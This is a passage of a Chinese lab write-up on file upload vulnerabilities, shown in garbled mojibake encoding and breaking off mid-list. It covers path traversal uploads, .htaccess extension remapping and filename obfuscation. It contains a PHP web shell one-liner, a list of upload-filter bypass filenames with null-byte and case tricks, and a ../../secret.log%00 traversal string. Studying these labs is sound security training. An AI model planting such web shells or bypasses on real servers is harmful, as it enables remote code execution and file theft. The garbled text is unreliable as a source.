<p>ä¸ºè°¨æ…èµ·è§ï¼ŒæœåŠ¡å™¨é€šå¸¸åªè¿è¡Œå…¶ MIME ç±»å‹å·²æ˜ç¡®é…ç½®ä¸ºå¯æ‰§è¡Œçš„è„šæœ¬ã€‚å¦åˆ™ï¼Œå®ƒä»¬å¯èƒ½åªä¼šè¿”å›æŸç§é”™è¯¯ä¿¡æ¯ï¼Œæˆ–è€…åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä»¥çº¯æ–‡æœ¬å½¢å¼æä¾›æ–‡ä»¶å†…å®¹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GET /static/exploit.php?command=<span class="built_in">id</span> HTTP/<span class="number">1.1</span></span><br><span class="line">    Host: normal-website.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">    Content-<span class="type">Type</span>: text/plain</span><br><span class="line">    Content-Length: <span class="number">39</span></span><br><span class="line"></span><br><span class="line">    &lt;?php echo system($_GET[<span class="string">&#x27;command&#x27;</span>]); ?&gt;</span><br></pre></td></tr></table></figure>
<p>è¿™ç§è¡Œä¸ºæœ¬èº«å¯èƒ½å¾ˆæœ‰è¶£ï¼Œå› ä¸ºå®ƒæä¾›äº†ä¸€ç§æ³„æ¼æºä»£ç çš„æ–¹æ³•ï¼Œä½†å®ƒä½¿ä»»ä½•åˆ›å»ºç½‘ç»œ shell çš„å°è¯•éƒ½åŒ–ä¸ºä¹Œæœ‰ã€‚</p>
<p>è¿™ç§é…ç½®é€šå¸¸å› ç›®å½•è€Œå¼‚ã€‚ä¸Šä¼ ç”¨æˆ·æä¾›æ–‡ä»¶çš„ç›®å½•å¯èƒ½æ¯”æ–‡ä»¶ç³»ç»Ÿä¸­å…¶ä»–ä½ç½®çš„æ§åˆ¶è¦ä¸¥æ ¼å¾—å¤šï¼Œå› ä¸ºå…¶ä»–ä½ç½®è¢«è®¤ä¸ºæ˜¯æœ€ç»ˆç”¨æˆ·æ— æ³•è®¿é—®çš„ã€‚å¦‚æœä½ èƒ½æ‰¾åˆ°ä¸€ç§æ–¹æ³•ï¼Œå°†è„šæœ¬ä¸Šä¼ åˆ°å¦ä¸€ä¸ªä¸åº”è¯¥åŒ…å«ç”¨æˆ·æä¾›æ–‡ä»¶çš„ç›®å½•ï¼Œé‚£ä¹ˆæœåŠ¡å™¨ç»ˆç©¶å¯èƒ½ä¼šæ‰§è¡Œä½ çš„è„šæœ¬ã€‚</p>
<p><font class="notice">æ³¨æ„ï¼šç½‘ç»œæœåŠ¡å™¨é€šå¸¸ä½¿ç”¨<code>multipart/form-data</code>è¯·æ±‚ä¸­çš„æ–‡ä»¶åå­—æ®µæ¥ç¡®å®šæ–‡ä»¶çš„åç§°å’Œä¿å­˜ä½ç½®ã€‚</font></p>
<h4 id="Labï¼šé€šè¿‡è·¯å¾„éå†ä¸Šä¼ ç½‘ç»œ-shell">Labï¼šé€šè¿‡è·¯å¾„éå†ä¸Šä¼ ç½‘ç»œ shell</h4>
<p>è¯¥å®éªŒå®¤åŒ…å«ä¸€ä¸ªæ˜“å—æ”»å‡»çš„å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½ã€‚æœåŠ¡å™¨è¢«é…ç½®ä¸ºé˜²æ­¢æ‰§è¡Œç”¨æˆ·æä¾›çš„æ–‡ä»¶ï¼Œä½†å¯é€šè¿‡åˆ©ç”¨æ¬¡è¦æ¼æ´ï¼ˆæ–‡ä»¶è·¯å¾„éå†ï¼‰ç»•è¿‡æ­¤é™åˆ¶ã€‚è¦è§£å†³è¯¥å®éªŒé—®é¢˜ï¼Œè¯·ä¸Šä¼ ä¸€ä¸ªåŸºæœ¬çš„ <code>PHP web shell</code>ï¼Œå¹¶ä½¿ç”¨å®ƒæ¥å¤–æ³„æ–‡ä»¶ <code>/home/carlos/secret</code> çš„å†…å®¹ã€‚ä½¿ç”¨å®éªŒå®¤æ¨ªå¹…ä¸­æä¾›çš„æŒ‰é’®æäº¤æ­¤ç§˜å¯†ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­æ®ç™»å½•è‡ªå·±çš„è´¦æˆ·ï¼š <code>wiener:peter</code></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>æŒ‰ç…§ä»¥å¾€çš„æ–¹å¼è®¿é—®è‡ªå·±ä¸Šä¼ çš„phpä»£ç ï¼ŒæœåŠ¡å™¨ç›´æ¥å°†phpä»£ç ä»¥æ–‡æœ¬æ–¹å¼è¿”å›</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250430183245601.png" alt="image-20250430183245601"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ä¿®æ”¹<code>filename</code>ç›®å½•éå†è¯­å¥è¢«æœåŠ¡å™¨æ¸…ç†</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250430183451599.png" alt="image-20250430183451599"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ä½¿ç”¨urlç¼–ç ä¸Šä¼ æˆåŠŸ</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250430183708967.png" alt="image-20250430183708967"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>è®¿é—®å³å¯</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250430183739696.png" alt="image-20250430183739696"></p>
<p>æ‚¨è¿˜åº”æ³¨æ„ï¼Œå°½ç®¡æ‚¨å¯èƒ½ä¼šå°†æ‰€æœ‰è¯·æ±‚å‘é€åˆ°åŒä¸€åŸŸåï¼Œä½†è¿™é€šå¸¸æŒ‡å‘æŸç§åå‘ä»£ç†æœåŠ¡å™¨ï¼Œå¦‚è´Ÿè½½å¹³è¡¡å™¨ã€‚æ‚¨çš„è¯·æ±‚é€šå¸¸ä¼šç”±å…¶ä»–æœåŠ¡å™¨åœ¨å¹•åå¤„ç†ï¼Œè¿™äº›æœåŠ¡å™¨çš„é…ç½®ä¹Ÿå¯èƒ½ä¸åŒã€‚</p>
<h3 id="å±é™©æ–‡ä»¶ç±»å‹é»‘åå•ä¸è¶³">å±é™©æ–‡ä»¶ç±»å‹é»‘åå•ä¸è¶³</h3>
<p>é˜²æ­¢ç”¨æˆ·ä¸Šä¼ æ¶æ„è„šæœ¬çš„ä¸€ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„æ–¹æ³•æ˜¯å°† <code>.php</code>  ç­‰æ½œåœ¨å±é™©çš„æ–‡ä»¶æ‰©å±•ååˆ—å…¥é»‘åå•ã€‚é»‘åå•çš„åšæ³•æœ¬è´¨ä¸Šæ˜¯æœ‰ç¼ºé™·çš„ï¼Œå› ä¸ºå¾ˆéš¾æ˜ç¡®é˜»æ­¢æ¯ä¸€ä¸ªå¯èƒ½ç”¨äºæ‰§è¡Œä»£ç çš„æ–‡ä»¶æ‰©å±•åã€‚æœ‰æ—¶å¯ä»¥é€šè¿‡ä½¿ç”¨è¾ƒä¸çŸ¥åçš„ã€ä»å¯æ‰§è¡Œçš„æ›¿ä»£æ–‡ä»¶æ‰©å±•åï¼ˆå¦‚ <code>.php5</code>ã€<code>.shtml</code> ç­‰ï¼‰æ¥ç»•è¿‡æ­¤ç±»é»‘åå•ã€‚é’ˆå¯¹è¿™ç§é˜²æŠ¤ï¼Œå¯ä»¥å°è¯•ä»¥ä¸‹å‡ ç§æ–¹å¼è¿›è¡Œç»•è¿‡ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ä½¿ç”¨ä¸å¸¸è§çš„åç¼€åï¼š<code>php5,pht,phpt,phtml,php3,php4,php5,php6</code></p>
</li>
<li class="lvl-2">
<p>ä½¿ç”¨å¤§å°å†™ï¼š<code>.pHp</code></p>
</li>
<li class="lvl-2">
<p>é‡å†™æœåŠ¡å™¨é…ç½®æ–‡ä»¶ï¼šapacheçš„<code>.htaccess</code>æˆ–è€…IISçš„<code>web.config</code></p>
</li>
<li class="lvl-2">
<p>ä½¿ç”¨å¤šæ‰©å±•åï¼Œè­¬å¦‚<code>example.php.jpg</code>ï¼Œè¿™ç§æ–¹å¼ä¾èµ–äºæœåŠ¡å™¨å¦‚ä½•è§£ææ–‡ä»¶ï¼Œå¦‚æœæœåŠ¡å™¨<strong>ä»å‰å¾€åè§£æï¼Œå¹¶ä¸”è§£æåˆ°ç¬¬ä¸€ä¸ªæ‰©å±•åå°±åœæ­¢è§£æ</strong>ï¼Œåˆ™è¯¥æ–‡ä»¶ä¼šè¢«å½“ä½œ<code>example.php</code>å­˜å‚¨</p>
</li>
<li class="lvl-2">
<p>æ·»åŠ å°¾éšå­—ç¬¦ï¼Œæœ‰äº›ç»„ä»¶å¯èƒ½ä¼šè¿‡æ»¤æˆ–å¿½è§†æ–‡ä»¶åæœ«å°¾çš„ç©ºæ ¼æˆ–å°æ•°ç‚¹ï¼Œè­¬å¦‚<code>example.php.</code>æˆ–<code>example.php </code> (æœ«å°¾æœ‰ä¸€ä¸ªç©ºæ ¼)</p>
</li>
<li class="lvl-2">
<p>å°è¯•ä½¿ç”¨urlç¼–ç ï¼Œè­¬å¦‚ï¼š<code>example%2ephp</code></p>
</li>
<li class="lvl-2">
<p>å†æ–‡ä»¶æ‰©å±•åå‰æ·»åŠ åˆ†å·æˆ–è€…urlç¼–ç çš„ç©ºå­—ç¬¦ï¼Œè­¬å¦‚ï¼š<code>example.php;jpg</code>æˆ–<code>example.php%00.jpg</code></p>
</li>
<li class="lvl-2">
<p>ä½¿ç”¨å¤šå­—èŠ‚Unicodeå­—ç¬¦ï¼Œè­¬å¦‚Unicodeå­—ç¬¦åºåˆ—ï¼š<code>xC0 xAE</code>ï¼Œ<code>xC4 xAE</code>ï¼Œ<code>xC0 x2E</code>å†utf-8ç¼–ç ä¸‹å¯èƒ½è½¬åŒ–ä¸º<code>x2E</code>ï¼Œç„¶åè½¬åŒ–ä¸ºASCIIå­—ç¬¦ä½¿ç”¨</p>
</li>
</ul>
<h4 id="è¦†ç›–æœåŠ¡å™¨é…ç½®">è¦†ç›–æœåŠ¡å™¨é…ç½®</h4>
<p>æ­£å¦‚æˆ‘ä»¬åœ¨ä¸Šä¸€èŠ‚æ‰€è®¨è®ºçš„ï¼Œé™¤éç»è¿‡é…ç½®ï¼Œå¦åˆ™æœåŠ¡å™¨é€šå¸¸ä¸ä¼šæ‰§è¡Œæ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œè‹¥å…è®¸ Apache æœåŠ¡å™¨æ‰§è¡Œå®¢æˆ·ç«¯è¯·æ±‚çš„ PHP æ–‡ä»¶ï¼Œå¼€å‘äººå‘˜éœ€è¦åœ¨ <code>/etc/apache2/apache2.conf</code> æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹æŒ‡ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LoadModule php_module /usr/lib/apache2/modules/libphp.so</span><br><span class="line">    AddType application/x-httpd-php .php</span><br></pre></td></tr></table></figure>
<p>è®¸å¤šæœåŠ¡å™¨è¿˜å…è®¸å¼€å‘äººå‘˜åœ¨ä¸ªåˆ«ç›®å½•ä¸­åˆ›å»ºç‰¹æ®Šé…ç½®æ–‡ä»¶ï¼Œä»¥è¦†ç›–æˆ–æ·»åŠ ä¸€ä¸ªæˆ–å¤šä¸ªå…¨å±€è®¾ç½®ã€‚ä¾‹å¦‚ï¼ŒApache æœåŠ¡å™¨ä¼šä»åä¸º <code>.htaccess</code> çš„æ–‡ä»¶ä¸­åŠ è½½ç‰¹å®šç›®å½•çš„é…ç½®ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ã€‚</p>
<p>åŒæ ·ï¼Œå¼€å‘äººå‘˜å¯ä»¥ä½¿ç”¨ <code>web.config</code> æ–‡ä»¶å¯¹ IIS æœåŠ¡å™¨è¿›è¡Œç‰¹å®šç›®å½•é…ç½®ã€‚è¿™å¯èƒ½åŒ…æ‹¬ä»¥ä¸‹æŒ‡ä»¤ï¼Œåœ¨æœ¬ä¾‹ä¸­ï¼Œè¿™äº›æŒ‡ä»¤å…è®¸å‘ç”¨æˆ·æä¾› JSON æ–‡ä»¶ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">staticContent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mimeMap</span> <span class="attr">fileExtension</span>=<span class="string">&quot;.json&quot;</span> <span class="attr">mimeType</span>=<span class="string">&quot;application/json&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">staticContent</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç½‘ç»œæœåŠ¡å™¨ä¼šä½¿ç”¨è¿™ç±»é…ç½®æ–‡ä»¶ï¼Œä½†é€šå¸¸ä¸å…è®¸ä½¿ç”¨ HTTP è¯·æ±‚è®¿é—®å®ƒä»¬ã€‚ä¸è¿‡ï¼Œä½ å¶å°”ä¼šå‘ç°æœåŠ¡å™¨æ— æ³•é˜»æ­¢ä½ ä¸Šä¼ è‡ªå·±çš„æ¶æ„é…ç½®æ–‡ä»¶ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå³ä½¿ä½ éœ€è¦çš„æ–‡ä»¶æ‰©å±•åè¢«åˆ—å…¥äº†é»‘åå•ï¼Œä½ ä¹Ÿå¯ä»¥æ¬ºéª—æœåŠ¡å™¨å°†ä»»æ„çš„è‡ªå®šä¹‰æ–‡ä»¶æ‰©å±•åæ˜ å°„åˆ°å¯æ‰§è¡Œçš„ MIME ç±»å‹ã€‚</p>
<h5 id="Labï¼šé€šè¿‡æ‰©å±•é»‘åå•ç»•è¿‡ç½‘ç»œå¤–å£³ä¸Šä¼ ">Labï¼šé€šè¿‡æ‰©å±•é»‘åå•ç»•è¿‡ç½‘ç»œå¤–å£³ä¸Šä¼ </h5>
<p>æœ¬å®éªŒå®¤åŒ…å«ä¸€ä¸ªæ˜“å—æ”»å‡»çš„å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½ã€‚æŸäº›æ–‡ä»¶æ‰©å±•åè¢«åˆ—å…¥äº†é»‘åå•ï¼Œä½†ç”±äºè¯¥é»‘åå•é…ç½®ä¸­çš„ä¸€ä¸ªåŸºæœ¬ç¼ºé™·ï¼Œè¿™ä¸€é˜²å¾¡å¯è¢«ç»•è¿‡ã€‚è¦è§£å†³è¯¥å®éªŒé—®é¢˜ï¼Œè¯·ä¸Šä¼ ä¸€ä¸ªåŸºæœ¬çš„ PHP web shellï¼Œç„¶åä½¿ç”¨å®ƒæ¸—å‡ºæ–‡ä»¶ /home/carlos/secret çš„å†…å®¹ã€‚ä½¿ç”¨å®éªŒæ¨ªå¹…ä¸­æä¾›çš„æŒ‰é’®æäº¤æ­¤ç§˜å¯†ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­æ®ç™»å½•è‡ªå·±çš„è´¦æˆ·ï¼šwiener:peterã€‚</p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        Hint
    </div>
    <div class="spoiler-content">
        <p>You need to upload two different files to solve this lab.</p>

    </div>
</div>
<ul class="lvl-0">
<li class="lvl-2">
<p>ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶å¤±è´¥ï¼ŒæœåŠ¡é‡‡ç”¨äº†é»‘åå•é˜²æŠ¤æœºåˆ¶</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505174128331.png" alt="image-20250505174128331"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>å°è¯•ä¸Šä¼ Apacheçš„é…ç½®æ–‡ä»¶<code>htaccess</code>ï¼Œå°†æ–‡ä»¶æ‰©å±•å <strong><code>.l33t</code></strong> å…³è”åˆ°PHPè§£æå™¨ï¼Œï¼Œæé†’ä¸Šä¼ æˆåŠŸ</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505174603001.png" alt="image-20250505174603001"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>å†è¯•ä¸Šä¼ æ¶æ„æ–‡ä»¶æˆåŠŸ</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505175302956.png" alt="image-20250505175302956"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>è®¿é—®å³å¯è·å¾—å¯†ç </p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505175433671.png" alt="image-20250505175433671"></p>
<p><strong>ä»£ç è§£é‡Šï¼š</strong></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">AddType <span class="built_in">application</span>/x-httpd-php .l33t</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong><code>AddType</code></strong>ï¼šApacheæŒ‡ä»¤ï¼Œç”¨äºå°†ç‰¹å®šæ–‡ä»¶æ‰©å±•åæ˜ å°„åˆ°å¯¹åº”çš„MIMEç±»å‹ã€‚</p>
</li>
<li class="lvl-2">
<p><strong><code>application/x-httpd-php</code></strong>ï¼šPHPè„šæœ¬çš„MIMEç±»å‹ï¼Œå‘Šè¯‰æœåŠ¡å™¨ä½¿ç”¨PHPè§£æå™¨å¤„ç†è¯¥æ–‡ä»¶ã€‚</p>
</li>
<li class="lvl-2">
<p><strong><code>.l33t</code></strong>ï¼šè‡ªå®šä¹‰çš„æ–‡ä»¶æ‰©å±•åï¼ˆé€šå¸¸ç”¨äºæ›¿ä»£å¸¸è§çš„ <code>.php</code>ï¼‰ã€‚</p>
</li>
</ul>
<p><strong>ä½œç”¨ï¼š</strong></p>
<ol>
<li class="lvl-3">
<p><strong>PHPè§£æ</strong>ï¼šæ‰€æœ‰ä»¥ <code>.l33t</code> ç»“å°¾çš„æ–‡ä»¶ä¼šè¢«Apacheè§†ä¸ºPHPè„šæœ¬ï¼Œ<strong>å…¶ä¸­çš„PHPä»£ç ä¼šè¢«æœåŠ¡å™¨è§£ææ‰§è¡Œ</strong>ã€‚</p>
</li>
<li class="lvl-3">
<p><strong>éšè—æŠ€æœ¯æ ˆ</strong>ï¼šé€šè¿‡éæ ‡å‡†æ‰©å±•åï¼ˆå¦‚ <code>.l33t</code>ï¼‰éšè—ç½‘ç«™ä½¿ç”¨çš„PHPæŠ€æœ¯ï¼Œå¢åŠ æ”»å‡»è€…è¯†åˆ«éš¾åº¦ï¼ˆä½†å®é™…å®‰å…¨æå‡æœ‰é™ï¼Œéœ€é…åˆå…¶ä»–æªæ–½ï¼‰ã€‚</p>
</li>
</ol>
<h4 id="æ··æ·†æ–‡ä»¶æ‰©å±•å">æ··æ·†æ–‡ä»¶æ‰©å±•å</h4>
<p>å³ä½¿æ˜¯æœ€è¯¦å°½çš„é»‘åå•ï¼Œä¹Ÿæœ‰å¯èƒ½è¢«ç»å…¸çš„æ··æ·†æŠ€æœ¯ç»•è¿‡ã€‚å‡è®¾éªŒè¯ä»£ç å¯¹å¤§å°å†™æ•æ„Ÿï¼Œæ— æ³•è¯†åˆ« exploit.pHp å®é™…ä¸Šæ˜¯ .php  æ–‡ä»¶ã€‚å¦‚æœéšåå°†æ–‡ä»¶æ‰©å±•åæ˜ å°„åˆ° MIME ç±»å‹çš„ä»£ç å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œè¿™ç§å·®å¼‚å°±ä¼šä½¿æ¶æ„ PHP æ–‡ä»¶å·å·é€šè¿‡éªŒè¯ï¼Œæœ€ç»ˆè¢«æœåŠ¡å™¨æ‰§è¡Œã€‚</p>
<p>æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŠ€æœ¯å®ç°ç±»ä¼¼çš„æ•ˆæœï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>æä¾›å¤šç§æ‰©å±•åã€‚æ ¹æ®è§£ææ–‡ä»¶åæ‰€ä½¿ç”¨çš„ç®—æ³•ï¼Œä»¥ä¸‹æ–‡ä»¶å¯èƒ½è¢«è§£é‡Šä¸º PHP æ–‡ä»¶æˆ– JPG å›¾åƒï¼šexploit.php.jpg</p>
</li>
<li class="lvl-2">
<p>æ·»åŠ å°¾éƒ¨å­—ç¬¦ã€‚æŸäº›ç»„ä»¶ä¼šåˆ é™¤æˆ–å¿½ç•¥å°¾éƒ¨ç©ºæ ¼ã€ç‚¹ç­‰ç±»ä¼¼å­—ç¬¦ï¼š exploit.php.jpgã€‚</p>
</li>
<li class="lvl-2">
<p>å°è¯•ä½¿ç”¨ URL ç¼–ç ï¼ˆæˆ–åŒ URL ç¼–ç ï¼‰æ¥å¤„ç†ç‚¹ã€æ­£æ–œçº¿å’Œåæ–œçº¿ã€‚å¦‚æœåœ¨éªŒè¯æ–‡ä»¶æ‰©å±•åæ—¶æœªå¯¹è¯¥å€¼è¿›è¡Œè§£ç ï¼Œä½†éšååœ¨æœåŠ¡å™¨ç«¯è¿›è¡Œäº†è§£ç ï¼Œè¿™æ ·ä¹Ÿå¯ä»¥ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼Œå¦åˆ™ä¼šè¢«é˜»æ­¢ï¼š exploit%2Ephpåœ¨æ–‡ä»¶æ‰©å±•åå‰æ·»åŠ åˆ†å·æˆ– URL ç¼–ç çš„ç©ºå­—èŠ‚å­—ç¬¦ã€‚</p>
</li>
<li class="lvl-2">
<p>å¦‚æœéªŒè¯æ˜¯ç”¨ PHP æˆ– Java ç­‰é«˜çº§è¯­è¨€ç¼–å†™çš„ï¼Œä½†æœåŠ¡å™¨ä½¿ç”¨ C/C++  ç­‰ä½çº§å‡½æ•°å¤„ç†æ–‡ä»¶ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´æ–‡ä»¶åæœ«å°¾çš„å¤„ç†ä¸ä¸€è‡´ï¼šexploit.asp;.jpg æˆ– exploit.asp%00.jpgå°è¯•ä½¿ç”¨å¤šå­—èŠ‚ unicode å­—ç¬¦ï¼Œè¿™äº›å­—ç¬¦å¯èƒ½åœ¨ unicode è½¬æ¢æˆ–è§„èŒƒåŒ–åè¢«è½¬æ¢ä¸ºç©ºå­—èŠ‚å’Œç‚¹ã€‚</p>
</li>
<li class="lvl-2">
<p>å¦‚æœæ–‡ä»¶åè¢«è§£æä¸º UTF-8 å­—ç¬¦ä¸²ï¼ŒxC0  x2Eã€xC4 xAE æˆ– xC0 xAE ç­‰åºåˆ—å¯èƒ½ä¼šè¢«è½¬æ¢ä¸º x2Eï¼Œä½†åœ¨è·¯å¾„ä¸­ä½¿ç”¨å‰åˆä¼šè¢«è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚</p>
</li>
</ul>
<p>å…¶ä»–é˜²å¾¡æªæ–½åŒ…æ‹¬åˆ é™¤æˆ–æ›¿æ¢å±é™©çš„æ‰©å±•åï¼Œä»¥é˜²æ­¢æ–‡ä»¶è¢«æ‰§è¡Œã€‚å¦‚æœè¿™ç§è½¬æ¢ä¸æ˜¯é€’å½’åº”ç”¨çš„ï¼Œä½ å¯ä»¥å°†ç¦æ­¢çš„å­—ç¬¦ä¸²å®šä½åœ¨è¿™æ ·ä¸€ç§æ–¹å¼ï¼Œå³åˆ é™¤å®ƒä»ç„¶ä¼šç•™ä¸‹ä¸€ä¸ªæœ‰æ•ˆçš„æ–‡ä»¶æ‰©å±•åã€‚ä¾‹å¦‚ï¼Œå¦‚æœä»ä»¥ä¸‹æ–‡ä»¶åä¸­åˆ é™¤ .php ä¼šå‘ç”Ÿä»€ä¹ˆæƒ…å†µï¼š</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">exploit<span class="selector-class">.p</span>.phphp</span><br></pre></td></tr></table></figure>
<p>è¿™åªæ˜¯æ··æ·†æ–‡ä»¶æ‰©å±•åçš„ä¼—å¤šæ–¹æ³•ä¸­çš„ä¸€å°éƒ¨åˆ†ã€‚</p>
<h5 id="Labï¼šé€šè¿‡æ··æ·†æ–‡ä»¶æ‰©å±•åä¸Šä¼ ç½‘ç»œå¤–å£³">Labï¼šé€šè¿‡æ··æ·†æ–‡ä»¶æ‰©å±•åä¸Šä¼ ç½‘ç»œå¤–å£³</h5>
<p>è¯¥å®éªŒå®¤åŒ…å«ä¸€ä¸ªæ˜“å—æ”»å‡»çš„å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½ã€‚æŸäº›æ–‡ä»¶æ‰©å±•åè¢«åˆ—å…¥äº†é»‘åå•ï¼Œä½†å¯ä»¥ä½¿ç”¨ç»å…¸çš„æ··æ·†æŠ€æœ¯ç»•è¿‡è¿™ä¸€é˜²å¾¡ã€‚è¦è§£å†³è¯¥å®éªŒé—®é¢˜ï¼Œè¯·ä¸Šä¼ ä¸€ä¸ªåŸºæœ¬çš„ PHP web shellï¼Œç„¶åç”¨å®ƒæ¥å¤–æ³„æ–‡ä»¶ /home/carlos/secret çš„å†…å®¹ã€‚ä½¿ç”¨å®éªŒå®¤æ¨ªå¹…ä¸­æä¾›çš„æŒ‰é’®æäº¤æ­¤ç§˜å¯†ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­æ®ç™»å½•è‡ªå·±çš„è´¦æˆ·ï¼šwiener:peter</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ç›´æ¥ä¸Šä¼ å¤±è´¥ï¼Œæç¤ºåªèƒ½ä¼ JPGå’ŒPNG</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505184603898.png" alt="image-20250505184603898"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><s>å•Šï¼Œè¿™å°±è¿‡å•¦</s>   æ·»åŠ åç¼€ï¼Œæ–‡ä»¶çš„åç¼€å¹¶æ²¡æœ‰å˜ï¼Œè€ƒè™‘æ·»åŠ ç©ºå­—èŠ‚</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505184818551.png" alt="image-20250505184818551"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>è¿™å°±å¯ä»¥äº†</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505214317371.png" alt="image-20250505214317371"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>è®¿é—®å°±å¯ä»¥å¾—åˆ°å¯†ç </p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505214506196.png" alt="image-20250505214506196"></p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        è¡¥å……
    </div>
    <div class="spoiler-content">
        <ul class="lvl-0">
<li class="lvl-2">
<p><code>%00</code> æ˜¯ <strong>URLç¼–ç çš„ç©ºå­—ç¬¦ï¼ˆNull Characterï¼‰</strong>ï¼Œå¯¹åº” ASCII ç ä¸­çš„ <code>0x00</code>ã€‚å®ƒåœ¨è®¡ç®—æœºç³»ç»Ÿä¸­é€šå¸¸è¡¨ç¤ºå­—ç¬¦ä¸²çš„<strong>ç»“æŸç¬¦</strong>ï¼Œä½†åœ¨ä¸åŒåœºæ™¯ä¸‹å¯èƒ½å¼•å‘å®‰å…¨é—®é¢˜æˆ–åŠŸèƒ½å¼‚å¸¸ã€‚</p>
</li>
<li class="lvl-2">
<p>æ—§ç‰ˆPHPï¼ˆ5.3ä¹‹å‰ï¼‰å­˜åœ¨ç©ºå­—èŠ‚é˜¶æ®µæ¼æ´ï¼ŒPHP&gt;=5.3ç‰ˆæœ¬ä¸­å·²å°†å…¶ä¿®å¤</p>
</li>
<li class="lvl-2">
<p>å¦‚ PHP çš„ <code>basename()</code> ä¼šè‡ªåŠ¨è¿‡æ»¤ç©ºå­—ç¬¦ã€‚</p>
</li>
<li class="lvl-2">
<p>åœ¨è·¯å¾„éå†åœ¨ä¹Ÿå¯ä»¥åˆ©ç”¨ <code>%00</code> æˆªæ–­è·¯å¾„ï¼Œè®¿é—®éæˆæƒæ–‡ä»¶ï¼ˆå¦‚ <code>../../secret.log%00</code>ï¼‰ã€‚</p>
</li>
<li class="lvl-2">
<p>å¤§å¤šæ•° Web æœåŠ¡å™¨å¹¶ä¸æ˜¯åœ¨ä¸€å¼€å§‹å®‰è£…æˆåŠŸåå°±èƒ½æ‰§è¡Œæ–‡ä»¶çš„ï¼Œåƒ Apacheï¼Œè¦æ‰§è¡Œ PHP è„šæœ¬ï¼Œéœ€è¦åœ¨ <code>/etc/apache2/apache2.conf</code> é…ç½®æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹æŒ‡ä»¤åŠ è½½ php æ¨¡å—ï¼Œä»¥åŠå½“è®¿é—®åç¼€åä¸º <code>.php</code> çš„æ–‡ä»¶æ—¶ï¼Œä½œä¸º php è„šæœ¬æ‰§è¡Œã€‚ï¼š</p>
</li>
</ul>
<blockquote>
<p>LoadModule php_module /usr/lib/apache2/modules/libphp.so<br>
AddType application/x-httpd-php .php</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>ä¸æ­¢ Apacheï¼ŒNginx å’Œ IIS ä¹Ÿéƒ½æ˜¯è¦åšä¸€äº›é…ç½®æ‰èƒ½æ‰§è¡Œè„šæœ¬ã€‚</p>
<ul class="lvl-2">
<li class="lvl-4">
